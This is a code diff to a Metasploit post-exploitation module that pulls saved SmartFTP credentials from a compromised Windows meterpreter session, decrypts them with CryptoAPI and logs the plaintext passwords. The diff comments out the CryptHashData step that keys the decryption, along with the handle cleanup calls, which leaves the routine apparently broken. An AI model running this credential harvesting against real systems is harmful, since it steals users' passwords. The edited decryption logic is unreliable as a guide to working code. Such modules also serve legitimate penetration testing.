@@ -23,6 +23,11 @@ class MetasploitModule < Msf::Post
         'Author' => [ 'theLightCosine'],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -113,11 +118,7 @@ class MetasploitModule < Msf::Post
       pass = decrypt(epassword)
 
       print_good("HOST: #{host} PORT: #{port} USER: #{user} PASS: #{pass}")
-      if session.db_record
-        source_id = session.db_record.id
-      else
-        source_id = nil
-      end
+
       service_data = {
         address: host,
         port: port,
@@ -144,7 +145,7 @@ class MetasploitModule < Msf::Post
       }
 
       login_data.merge!(service_data)
-      login = create_credential_login(login_data)
+      create_credential_login(login_data)
     end
   end
 
@@ -161,12 +162,12 @@ class MetasploitModule < Msf::Post
 
     acquirecontext = advapi32.CryptAcquireContextW(4, nil, ms_enhanced_prov, prov_rsa_full, crypt_verify_context)
     createhash = advapi32.CryptCreateHash(acquirecontext['phProv'], alg_md5, 0, 0, 4)
-    hashdata = advapi32.CryptHashData(createhash['phHash'], 'SmartFTP', 16, 0)
+    # hashdata = advapi32.CryptHashData(createhash['phHash'], 'SmartFTP', 16, 0)
     derivekey = advapi32.CryptDeriveKey(acquirecontext['phProv'], alg_rc4, createhash['phHash'], 0x00800000, 4)
     decrypted = advapi32.CryptDecrypt(derivekey['phKey'], 0, true, 0, cipher, cipher.length)
-    destroyhash = advapi32.CryptDestroyHash(createhash['phHash'])
-    destroykey = advapi32.CryptDestroyKey(derivekey['phKey'])
-    releasecontext = advapi32.CryptReleaseContext(acquirecontext['phProv'], 0)
+    # destroyhash = advapi32.CryptDestroyHash(createhash['phHash'])
+    # destroykey = advapi32.CryptDestroyKey(derivekey['phKey'])
+    # releasecontext = advapi32.CryptReleaseContext(acquirecontext['phProv'], 0)
 
     data = decrypted['pbData']
     data.gsub!(/\x00/, '')
